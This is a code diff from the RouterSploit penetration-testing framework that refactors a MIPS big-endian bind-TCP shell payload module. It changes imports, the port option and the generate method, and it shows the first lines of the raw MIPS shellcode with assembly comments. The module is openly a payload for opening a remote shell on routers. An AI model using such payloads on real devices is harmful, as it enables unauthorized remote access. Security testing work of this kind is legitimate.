@@ -1,11 +1,12 @@
-from routersploit import (
-    exploits,
-    payloads,
-    validators
+from routersploit import validators
+from routersploit.payloads import (
+    ArchitectureSpecificPayload,
+    Architectures,
+    BindTCPPayloadMixin,
 )
 
 
-class Exploit(payloads.Payload):
+class Exploit(BindTCPPayloadMixin, ArchitectureSpecificPayload):
     __info__ = {
         'name': 'MIPSBE Bind TCP',
         'authors': [
@@ -17,13 +18,11 @@ class Exploit(payloads.Payload):
         ],
     }
 
-    architecture = "mipsbe"
-    port = exploits.Option(5555, 'Bind Port', validators=validators.integer)
+    architecture = Architectures.MIPSBE
 
     def generate(self):
-        bind_port = self.convert_port(self.port)
-
-        self.payload = (
+        bind_port = validators.convert_port(self.rport)
+        return (
             # socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
             "\x27\xbd\xff\xe0" +        # addiu   sp,sp,-32
             "\x24\x0e\xff\xfd" +        # li      t6,-3
